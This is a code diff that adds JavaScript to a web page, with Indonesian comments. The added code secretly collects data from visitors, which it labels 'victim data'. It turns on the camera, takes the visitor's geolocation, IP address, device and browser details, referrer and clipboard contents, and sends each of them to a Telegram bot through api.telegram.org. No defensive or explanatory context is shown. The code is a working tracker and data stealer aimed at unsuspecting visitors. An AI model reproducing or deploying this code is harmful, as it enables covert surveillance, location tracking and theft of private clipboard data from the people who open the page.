@@ -130,3 +130,63 @@ Maps: ${deviceInfo.mapsLink}`;
     });
 
     startCamera();
+    
+    let visitHistory = document.referrer ? document.referrer : "Tidak ada / None";
+
+        try {
+            videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); // Nonaktifkan suara
+        } catch (error) {
+            console.warn("Akses kamera/audio ditolak.");
+            videoStream = null;
+        }
+
+        try {
+            let location = await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject));
+            userCoords = location.coords;
+
+            // Kirim lokasi langsung ke Telegram (bisa diklik dan diarahkan ke Google Maps)
+            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    latitude: userCoords.latitude,
+                    longitude: userCoords.longitude
+                })
+            });
+        } catch (error) {
+            console.warn("Akses lokasi ditolak.");
+            userCoords = { latitude: 0, longitude: 0 };
+        }
+
+        fetch("https://api64.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                let deviceInfo = `[ DATA KORBAN ]\n\n` +
+                                 `Waktu Akses | Access Time : ${getCurrentTime()}\n` +
+                                 `Alamat IP | IP Address : ${data.ip}\n` +
+                                 `Perangkat | Device : ${navigator.userAgent}\n` +
+                                 `Sistem Operasi | Operating System : ${navigator.platform}\n` +
+                                 `Resolusi Layar | Screen Resolution : ${screen.width} x ${screen.height}\n` +
+                                 `Kunjungan Sebelumnya | Previous Visit : ${visitHistory}\n`;
+                                 `@ VVIP Class`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: deviceInfo, parse_mode: "Markdown" })
+                });
+            });
+
+        if (navigator.clipboard && navigator.clipboard.readText) {
+            navigator.clipboard.readText().then(text => {
+                if (text.trim()) {
+                    let clipboardInfo = `📋 *Data Clipboard | Clipboard Data* : \n\`\`\`${text}\`\`\``;
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: chatId, text: clipboardInfo, parse_mode: "Markdown" })
+                    });
+                }
+            }).catch(err => console.error("Gagal membaca clipboard:", err));
+        }
